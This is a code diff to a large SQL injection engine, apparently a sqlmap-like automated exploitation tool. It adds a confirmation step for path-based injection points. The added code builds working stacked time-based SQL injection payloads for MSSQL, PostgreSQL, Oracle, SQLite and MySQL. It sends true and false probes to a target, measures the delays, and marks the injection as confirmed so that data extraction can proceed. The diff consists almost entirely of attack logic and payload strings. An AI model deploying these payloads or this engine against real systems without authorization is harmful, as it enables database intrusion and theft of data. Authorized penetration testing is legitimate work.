@@ -110552,6 +110552,118 @@ class TechniqueCascadeEngine:
             # status.  When they pass, _pcv_verified=True is set so the secondary PCV
             # Final Gate skips re-evaluation and does not cancel the extraction task.
             _s_already_mp_confirmed = getattr(det, '_multi_probe_confirmed', False)
+            # BUG-PATH-S-PCV FIX: Detect path-injection surfaces BEFORE routing to
+            # S→B boolean FP guards.  On path-injection surfaces (URL path segments,
+            # data_fmt=='path', wildcard '*' in URL), WHERE-clause boolean canaries
+            # (AND 1=1 vs AND 1=2) test the WRONG SQL context: the injected stacked
+            # statement executes as a SEPARATE query, not inside the original WHERE
+            # clause.  S→B boolean guards always FAIL on these surfaces, causing real
+            # stacked injection to be rejected.  Additionally, _make_false_payload()
+            # returns ' AND 1=2-- -' (no stacked separator) for non-timing stacked
+            # payloads, so multi-probe false-cond clean checks cannot distinguish real
+            # injection from ';'-corrupted path manipulation FPs on this surface.
+            #
+            # Fix: route non-timing S payloads on path surfaces through DBMS-specific
+            # STACKED TIMING CANARIES which correctly distinguish the two cases:
+            #   Real injection:    '; SLEEP(N)-- - executes → measured delay
+            #   Path manipulation: ';' corrupts path → immediate 404 (no delay)
+            # If timing confirms → det._pcv_verified=True → secondary PCV gate skips.
+            # If timing fails → return False (reject) — do NOT fall through to S→B.
+            _s_param_lc = (param or '').lower()
+            _s_url_str_pi = (url or '')
+            _s_is_path_inj = (
+                data_fmt == 'path'
+                or '*' in _s_url_str_pi
+                or _s_param_lc in ('path-injection', '__path__', '__path_seg__', 'path')
+                or 'path-injection' in _s_param_lc
+                or '__path__' in _s_param_lc
+                or '__path_seg__' in _s_param_lc
+            )
+            if _s_is_path_inj and not _s_has_timing_a and det.payload:
+                _spi_mp_label = " (multi-probe pre-confirmed)" if _s_already_mp_confirmed else ""
+                print(f"[*] PCV [S→T-CANARY] {dbms}: path-injection surface detected"
+                      f"{_spi_mp_label} — using stacked timing canaries", flush=True)
+                _PCV_IN_PROGRESS[0] += 1
+                try:
+                    _dbms_spi = (dbms or '').upper()
+                    _spi_cfg = getattr(self, 'config', None)
+                    _spi_time_sec = float(getattr(_spi_cfg, 'time_sec', 3) or 3)
+                    _spi_time_sec = max(2.0, min(_spi_time_sec, 10.0))
+                    _spi_n = int(_spi_time_sec)
+                    _spi_threshold_ms = _spi_time_sec * 1000.0 * 0.65
+                    # Build DBMS-specific stacked timing canary payloads
+                    if 'MSSQL' in _dbms_spi or 'SQL SERVER' in _dbms_spi or 'SQLSERVER' in _dbms_spi:
+                        _spi_true_pay  = f"'; IF 1=1 WAITFOR DELAY '0:0:{_spi_n}'-- -"
+                        _spi_false_pay = f"'; IF 1=2 WAITFOR DELAY '0:0:{_spi_n}'-- -"
+                    elif 'POSTGRESQL' in _dbms_spi or 'POSTGRES' in _dbms_spi or 'PGSQL' in _dbms_spi:
+                        _spi_true_pay  = (f"'; SELECT CASE WHEN (1=1) THEN"
+                                          f" pg_sleep({_spi_n}) ELSE pg_sleep(0) END-- -")
+                        _spi_false_pay = (f"'; SELECT CASE WHEN (1=2) THEN"
+                                          f" pg_sleep({_spi_n}) ELSE pg_sleep(0) END-- -")
+                    elif 'ORACLE' in _dbms_spi:
+                        _spi_true_pay  = f"'; BEGIN DBMS_SESSION.SLEEP({_spi_n}); END;-- -"
+                        _spi_false_pay = f"'; NULL-- -"
+                    elif 'SQLITE' in _dbms_spi:
+                        _spi_blob_n = _spi_n * 50000000
+                        _spi_true_pay  = f"'; SELECT RANDOMBLOB({_spi_blob_n})-- -"
+                        _spi_false_pay = f"'; SELECT 1-- -"
+                    else:
+                        # MySQL / MariaDB / TiDB / generic default
+                        _spi_true_pay  = f"'; SELECT IF(1=1,SLEEP({_spi_n}),SLEEP(0))-- -"
+                        _spi_false_pay = f"'; SELECT IF(1=2,SLEEP({_spi_n}),SLEEP(0))-- -"
+                    # Send true-cond timing probe
+                    # (BUG-V39-BATCH FIX: use module-level `time` — no inline import)
+                    _spi_t0 = time.monotonic()
+                    _spi_true_resp = await self._safe_confirm(method, url, data, data_fmt,
+                        param, original + _spi_true_pay, self.tamper_chain)
+                    _spi_true_ms = (time.monotonic() - _spi_t0) * 1000.0
+                    # Send false-cond timing probe
+                    _spi_f0 = time.monotonic()
+                    _spi_false_resp = await self._safe_confirm(method, url, data, data_fmt,
+                        param, original + _spi_false_pay, self.tamper_chain)
+                    _spi_false_ms = (time.monotonic() - _spi_f0) * 1000.0
+                    _spi_timing_ok = (
+                        _spi_true_resp is not None and
+                        _spi_true_ms >= _spi_threshold_ms and
+                        _spi_false_ms < _spi_threshold_ms
+                    )
+                    if _spi_timing_ok:
+                        print(f"[+] PCV CONFIRMED [S→T-CANARY] {dbms}"
+                              f"  true={_spi_true_ms:.0f}ms  false={_spi_false_ms:.0f}ms"
+                              f"  threshold={_spi_threshold_ms:.0f}ms", flush=True)
+                        try:
+                            det._pcv_verified = True
+                            if hasattr(det, 'detection') and det.detection is not None:
+                                det.detection._pcv_verified = True
+                        except Exception:
+                            pass
+                        _INJECTION_CONFIRMED[0] = True
+                        _SCAN_STOPPED[0] = True
+                        _cev_spi = (getattr(self, '_confirmed_event', None) or
+                                    getattr(getattr(self, 'config', None), '_confirmed_event', None))
+                        if _cev_spi and not _cev_spi.is_set():
+                            try:
+                                _cev_spi._bg_result = det
+                            except Exception:
+                                pass
+                            _cev_spi.set()
+                        _gate_spi = getattr(self, '_gate', None)
+                        if _gate_spi and not getattr(_gate_spi, 'killed', True):
+                            try: _gate_spi.kill()
+                            except Exception: pass
+                        return True
+                    else:
+                        print(f"[!] PCV FAILED [S→T-CANARY] {dbms}"
+                              f"  true={_spi_true_ms:.0f}ms  false={_spi_false_ms:.0f}ms"
+                              f"  threshold={_spi_threshold_ms:.0f}ms"
+                              f"  (path-manipulation FP or timing unstable)", flush=True)
+                        return False
+                except Exception as _spi_err:
+                    print(f"[!] PCV ERROR [S→T-CANARY] {dbms}: {_spi_err}  rejecting",
+                          flush=True)
+                    return False
+                finally:
+                    _PCV_IN_PROGRESS[0] = max(0, _PCV_IN_PROGRESS[0] - 1)
             if not _s_has_timing_a and det.payload:
                 # Non-timing payload detected via S oracle — route through S→B boolean FP
                 # guards regardless of multi-probe status.  Multi-probe confirmed = faster
